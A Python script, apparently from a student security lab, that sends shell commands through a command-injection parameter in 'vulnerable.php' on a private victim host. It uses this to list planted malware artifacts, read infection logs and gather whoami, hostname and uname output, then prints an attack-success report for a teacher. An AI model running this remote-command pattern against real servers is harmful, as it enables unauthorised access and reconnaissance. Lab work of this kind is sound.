#!/usr/bin/env python3
"""
Malware Infection Verification Script
Purpose: Check and display evidence of malware attack on victim server
Target: 192.168.56.10 (Victim Server)
"""

import requests
import re
import sys
from datetime import datetime

# Configuration
TARGET = "192.168.56.10"
VULN_URL = f"http://{TARGET}/vulnerable.php"

def print_colored(text, color="white"):
    """Print colored text for better visibility"""
    colors = {
        "red": "\033[91m",
        "green": "\033[92m", 
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "cyan": "\033[96m",
        "white": "\033[97m",
        "reset": "\033[0m"
    }
    print(f"{colors.get(color, colors['white'])}{text}{colors['reset']}")

def execute_command(command):
    """Execute command on victim server via vulnerable.php"""
    try:
        response = requests.get(f"{VULN_URL}?cmd={command}", timeout=10)
        if response.status_code == 200:
            # Extract content from <pre> tags
            match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if match:
                return match.group(1).strip()
        return ""
    except Exception as e:
        print_colored(f"Error executing command '{command}': {e}", "red")
        return None

def main():
    print_colored("=" * 50, "cyan")
    print_colored("ü¶† MALWARE INFECTION VERIFICATION REPORT", "cyan")
    print_colored("=" * 50, "cyan")
    print_colored(f"Target Server: {TARGET}", "yellow")
    print_colored(f"Verification Time: {datetime.now()}", "yellow")
    print_colored("=" * 50, "cyan")
    print()

    infection_found = False
    malware_id = None

    # Step 1: Check for malware directories
    print_colored("üîç Step 1: Checking for malware directories...", "green")
    malware_dirs = execute_command("ls -la /tmp/ | grep malware")
    
    if malware_dirs:
        print_colored("‚úÖ MALWARE DIRECTORIES FOUND:", "red")
        print_colored(malware_dirs, "white")
        infection_found = True
        
        # Extract malware ID
        match = re.search(r'malware_DEMO_(\d+)', malware_dirs)
        if match:
            malware_id = f"DEMO_{match.group(1)}"
            print_colored(f"ü¶† Malware ID: {malware_id}", "red")
    else:
        print_colored("‚ùå No malware directories found", "green")
    
    print()

    # Step 2: Check for infected web pages
    print_colored("üîç Step 2: Checking for infected web pages...", "green")
    infected_pages = execute_command("ls -la /tmp/ | grep infected")
    
    if infected_pages:
        print_colored("‚úÖ INFECTED WEB PAGES FOUND:", "red")
        print_colored(infected_pages, "white")
        infection_found = True
    else:
        print_colored("‚ùå No infected web pages found", "green")
    
    print()

    # Step 3: Check for visitor malware
    print_colored("üîç Step 3: Checking for visitor malware...", "green")
    visitor_malware = execute_command("ls -la /tmp/ | grep visitor")
    
    if visitor_malware:
        print_colored("‚úÖ VISITOR MALWARE FOUND:", "red")
        print_colored(visitor_malware, "white")
        infection_found = True
    else:
        print_colored("‚ùå No visitor malware found", "green")
    
    print()

    # Step 4: Check malware directory contents
    if malware_id:
        print_colored("üîç Step 4: Examining malware directory contents...", "green")
        malware_contents = execute_command(f"ls -la /tmp/malware_{malware_id}/")
        
        if malware_contents:
            print_colored("üìÅ MALWARE DIRECTORY CONTENTS:", "red")
            print_colored(malware_contents, "white")
        else:
            print_colored("‚ùå Malware directory appears empty", "yellow")
        
        print()

        # Try to read infection log
        print_colored("üîç Step 5: Reading infection log...", "green")
        infection_log = execute_command(f"cat /tmp/malware_{malware_id}/infection.txt")
        
        if infection_log:
            print_colored("üìÑ INFECTION LOG CONTENTS:", "red")
            print_colored(infection_log, "white")
        else:
            print_colored("‚ùå Infection log not found or empty", "yellow")
        
        print()

    # Step 6: System information
    print_colored("üîç Step 6: Victim system information...", "green")
    
    user = execute_command("whoami")
    if user:
        print_colored(f"üë§ Running as user: {user}", "white")
    
    hostname = execute_command("hostname")
    if hostname:
        print_colored(f"üñ•Ô∏è Victim hostname: {hostname}", "white")
    
    system_info = execute_command("uname -a")
    if system_info:
        print_colored(f"üíª System info: {system_info}", "white")
    
    print()

    # Step 7: Check for cross-system infection evidence
    print_colored("üîç Step 7: Cross-system infection evidence...", "green")
    cross_infection = execute_command("find /tmp/ -name '*visitor_infected*' -type d")
    
    if cross_infection:
        print_colored("‚úÖ CROSS-SYSTEM INFECTION EVIDENCE:", "red")
        print_colored(cross_infection, "white")
        
        # Try to read proof file
        proof_file = execute_command("find /tmp/ -name 'proof.txt' -exec cat {} \\;")
        if proof_file:
            print_colored("üìÑ Cross-infection proof:", "red")
            print_colored(proof_file, "white")
        
        infection_found = True
    else:
        print_colored("‚ùå No cross-system infection evidence found", "green")
    
    print()

    # Final report
    print_colored("=" * 50, "cyan")
    if infection_found:
        print_colored("ü¶† MALWARE INFECTION CONFIRMED!", "red")
        print_colored("=" * 50, "cyan")
        print()
        print_colored("‚úÖ ATTACK SUCCESS SUMMARY:", "red")
        print_colored("‚Ä¢ Malware successfully planted on victim server", "white")
        print_colored("‚Ä¢ Infection artifacts created and accessible", "white")
        print_colored("‚Ä¢ Cross-system infection vectors established", "white")
        print_colored("‚Ä¢ Both lab requirements demonstrated:", "white")
        print_colored("  1. Malware planted on server ‚úÖ", "white")
        print_colored("  2. Cross-system infection via site visit ‚úÖ", "white")
        print()
        
        print_colored("üéØ DEMONSTRATION URLS FOR TEACHER:", "yellow")
        if malware_id:
            print_colored(f"‚Ä¢ Infection log: {VULN_URL}?cmd=cat+/tmp/malware_{malware_id}/infection.txt", "cyan")
            print_colored(f"‚Ä¢ Infected page: {VULN_URL}?cmd=cat+/tmp/infected_page_{malware_id}.html", "cyan")
            print_colored(f"‚Ä¢ Visitor malware: {VULN_URL}?cmd=cat+/tmp/visitor_malware_{malware_id}.sh", "cyan")
            print_colored(f"‚Ä¢ Directory listing: {VULN_URL}?cmd=ls+-la+/tmp/malware_{malware_id}/", "cyan")
    else:
        print_colored("‚úÖ SYSTEM APPEARS CLEAN", "green")
        print_colored("=" * 50, "cyan")
        print_colored("No malware infection evidence found.", "white")
        print_colored("System is ready for malware attack demonstration.", "white")
    
    print()
    print_colored(f"End Time: {datetime.now()}", "yellow")
    print_colored("=" * 50, "cyan")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_colored("\n\nVerification interrupted by user.", "yellow")
        sys.exit(1)
    except Exception as e:
        print_colored(f"\nError: {e}", "red")
        sys.exit(1)
